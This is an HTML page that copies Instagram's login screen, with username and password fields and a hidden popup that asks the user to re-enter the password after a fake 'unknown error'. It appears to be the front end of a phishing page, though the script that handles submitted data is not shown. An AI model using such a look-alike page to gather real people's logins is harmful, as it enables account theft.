<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="instagram.css">
</head>
    
<body>
    <form id="container">
        <div id="img-cont">
            <img id="logo" src="images/instagram.png" alt="Instagram logo">
        </div>
        <input id="identity" type="text" placeholder="Phone number, username or email">
        <div id="pass-container">
            <input id="pass" type="password" placeholder="Password">
            <button type="button" id="togglePass">
                <img src="images/show.svg" alt="show" id="sh">
            </button>
        </div>
        <button id="f-p">Forgot password?</button>
        <button id="bu" onclick="submitDetails()" type="submit">Log In</button>
    </form>
    <div id="popup" class="hidden">
        <div class="popup-content">
            <span class="close" id="closePopup">&times;</span>
            <p>Sorry, an unknown error occurred, please enter the password.</p>
        </div>
    </div>
</body>
<script src="instagram.js"></script>
</html>
